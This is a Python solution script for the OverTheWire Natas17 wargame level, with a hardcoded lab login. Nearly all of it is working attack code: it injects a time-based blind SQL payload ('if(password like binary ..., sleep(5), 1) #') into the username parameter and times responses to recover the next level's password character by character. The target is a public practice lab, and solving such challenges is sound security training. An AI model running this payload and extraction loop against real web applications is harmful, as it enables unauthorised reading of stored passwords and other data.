import requests, string

url = "http://natas17.natas.labs.overthewire.org"
auth_username = "natas17"
auth_password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"


characters = ''.join([string.ascii_letters, string.digits])
"""
password_dict = []

for char in characters:
    username = 'natas18" and if(password like binary "%%%c%%",sleep(5), 1) #' % (char)
    r = requests.get(url, auth=(auth_username,auth_password), params={"username": username})
    if (r.elapsed.seconds >= 1):
        password_dict.append(char)
        print("Password Dict: {}".format(''.join(password_dict)))
print("Dictionary build complete")
print("Dictionary: {}".format(''.join(password_dict)))
print("Now attempting to brute force")"""

password_dict = 'bdgjlpxyBCDGJKLOPRVXYZ14568'
password = ''

for i in range (1,32):
    for char in password_dict:
        test = password + char
        print('this is ' + test)
        username = 'natas18" and if(password like binary "%s%%",sleep(5), 1) #' % (test)
        r = requests.get(url, auth=(auth_username,auth_password), params={"username": username})
        if (r.elapsed.seconds >= 1):
            password = password + char
            print('found letter :' + char)
            break
            
print("password has been found")
